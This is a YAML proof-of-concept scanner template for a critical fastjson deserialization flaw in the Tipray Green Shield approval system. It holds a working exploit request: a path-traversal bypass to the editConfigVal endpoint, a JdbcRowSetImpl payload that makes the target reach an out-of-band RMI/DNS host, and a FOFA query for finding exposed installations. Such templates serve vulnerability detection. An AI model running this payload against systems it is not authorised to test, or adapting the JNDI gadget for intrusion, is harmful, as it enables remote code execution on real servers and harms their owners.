id: poc-yaml-tipray-gsas-editconfigval-fastjson-deserialization
info:
  name: 天锐绿盾审批系统 editConfigVal fastjson 反序列化漏洞
  severity: critical
  tags:
  - 反序列化
  - DNSLOG
  finger: 天锐绿盾审批系统
  fofa: app="TIPPAY-绿盾审批系统"
variables:
  reverse: new_dns_log()
  domain: reverse.Domain()
  random: random_str(6)
requests:
- method: POST
  path: /trwfe/login.jsp/.%2e/rest/conf/editConfigVal
  headers:
    Content-Type: application/json
  data: "{\n  \"@type\": \"com.sun.rowset.JdbcRowSetImpl\",\n  \"dataSourceName\"\
    : \"rmi://{{.domain}}/{{.random}}\",\n  \"autoCommit\": true\n}"
  expression: 'status_code == 200 &&

    contains(content_type,"application/json") &&

    !contains(body,"<") &&

    reverse.Verify()

    '
transport: http
